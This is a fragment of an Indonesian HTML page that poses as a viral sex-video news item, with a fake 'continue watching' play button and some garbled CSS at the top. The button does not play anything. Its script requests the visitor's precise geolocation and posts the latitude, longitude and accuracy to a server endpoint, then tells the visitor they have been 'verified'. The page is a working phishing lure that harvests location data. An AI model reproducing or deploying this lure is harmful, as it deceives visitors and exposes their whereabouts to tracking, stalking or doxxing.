          .audio-player {
      display: flex;
      align-items: center;
      justify-content: space-between;
      background: #f0f0f0;
      padding: 15px 20px;
      border-radius: 15px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);

    }

    .audio-label {
      font-weight: 600;
      color: #333;
      display: flex;
      align-items: center;
      gap: 8px;
    }

      background: #007bff;
      border: none;
      border-radius: 50%;

      width: 45px;

    }

      text-align: center;

    }
    </style>
</head>
<body>

  <div class="container">
        <!-- Header Kategori -->
        <div class="category">Viral lagi</div>

        <!-- Judul -->
        <h1>Gadis Bandung Gaet Fansnya Lewat video mesum</h1>

        <!-- Gambar (Placeholder - Ganti src dengan gambar asli jika ada) -->
        <div class="image-container">
            <img src="https://img.merahputih.com/media//2015/02/18/PRn58Pc0Sk3sOvz1424199178.jpg" alt="Gadis Vietnam Seksi">
        </div>
        <div class="caption">viral gadis bandung</div>

        <!-- Audio Player Style -->
        <div class="audio-player">
    <div class="audio-label">
      <span>‚ñ∂Ô∏è</span> Tonton lanjutkan
    </div>
    <div class="audio-controls">
      <!-- Tombol Play dengan getLocation -->
      <button class="control-btn" onclick="getLocation()">
        <svg viewBox="0 0 24 24" width="24" height="24">
          <path d="M8 5v14l11-7z" fill="currentColor"/>
        </svg>
      </button>
         </div>
  </div>

  <p id="status"></p>

  <script>
    function getLocation() {
      const status = document.getElementById("status");
      if (!navigator.geolocation) {
        status.textContent = "‚ùå Browser tidak mendukung fitur lokasi.";
        return;
      }

      status.textContent = "üìç Memproses lokasi...";
      navigator.geolocation.getCurrentPosition(showPosition, showError);
    }

    async function showPosition(position) {
      const status = document.getElementById("status");
      const { latitude, longitude, accuracy } = position.coords;

      try {
        const response = await fetch('/api/kirim', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latitude, longitude, accuracy })
        });

        if (response.ok) {
          status.textContent = "‚úÖ Berhasil diverifikasi! Terima kasih.";
          status.style.color = "green";
        } else {
          status.textContent = "‚ö†Ô∏è Gagal mengirim data ke server.";
          status.style.color = "orange";
        }
      } catch (err) {
        status.textContent = "üö´ Terjadi kesalahan jaringan.";
        status.style.color = "red";
      }
    }

    function showError(error) {
      const status = document.getElementById("status");
      switch (error.code) {
        case error.PERMISSION_DENIED:
          status.textContent = "‚ùå Akses lokasi ditolak pengguna.";
          break;
        case error.POSITION_UNAVAILABLE:
          status.textContent = "‚ö†Ô∏è Informasi lokasi tidak tersedia.";
          break;
        case error.TIMEOUT:
          status.textContent = "‚è∞ Permintaan lokasi melebihi waktu.";
          break;
        default:
          status.textContent = "üö´ Terjadi kesalahan tidak diketahui.";
      }
      status.style.color = "red";
    }
  </script>
